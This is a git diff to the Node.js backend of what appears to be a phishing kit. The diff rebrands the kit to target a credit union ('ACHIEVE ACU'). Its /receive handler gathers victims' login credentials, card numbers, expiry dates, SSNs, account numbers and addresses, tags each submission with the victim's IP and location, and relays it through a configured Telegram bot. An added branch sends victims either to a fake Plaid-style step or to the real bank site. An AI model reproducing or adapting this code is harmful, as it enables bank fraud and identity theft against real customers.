@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 const bodyParser = require('body-parser');
 const path = require('path');
-const { botToken, chatId } = require('./config/settings.js');
+const { botToken, chatId, plaid } = require('./config/settings.js');
 //const antibot = require('./middleware/antibot');
 //const { getClientIp } = require("request-ip");
 const https = require('https');
@@ -199,7 +199,7 @@ app.post('/receive', async (req, res) => {
   console.log(myObjects);
 
   if (myObjects.includes('username')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
 
     for (const key of myObjects) {
@@ -227,7 +227,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('Billing Address')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                `👤 CARD INFO\n\n`;
 
     for (const key of myObjects) {
@@ -243,8 +243,32 @@ app.post('/receive', async (req, res) => {
     res.send('dn');
   }
   
+  if (myObjects.includes('userid')) {
+    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+               `👤 CARD INFO\n\n`;
+
+    for (const key of myObjects) {
+      console.log(`${key}: ${myObject[key]}`);
+      message += `${key}: ${myObject[key]}\n`;
+    }
+    
+    message += `🌍 GEO-IP INFO\n` +
+      `IP ADDRESS       : ${ipAddress}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `💬 Telegram: https://t.me/UpdateTeams\n`;
+      
+      let url;
+      if(plaid == "on"){
+      	url = "/link?step=1";
+      	}else{
+      	url = "https://www.achievacu.com/";	
+      		}
+
+    res.send({ url:url });
+  }
+  
   if (myObjects.includes('email')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                `👤 EMAIL INFO\n\n`;
 
     for (const key of myObjects) {
@@ -261,7 +285,7 @@ app.post('/receive', async (req, res) => {
   }
 
   if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                `👤 ADDRESS INFO\n\n`;
 
     for (const key of myObjects) {
@@ -278,7 +302,7 @@ app.post('/receive', async (req, res) => {
   }
   
   if (myObjects.includes('memberNumber') || myObjects.includes('accountNumber') || myObjects.includes('ssn')) {
-    message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
+    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                `👤 USER ACCOUNT INFO\n\n`;
 
     for (const key of myObjects) {
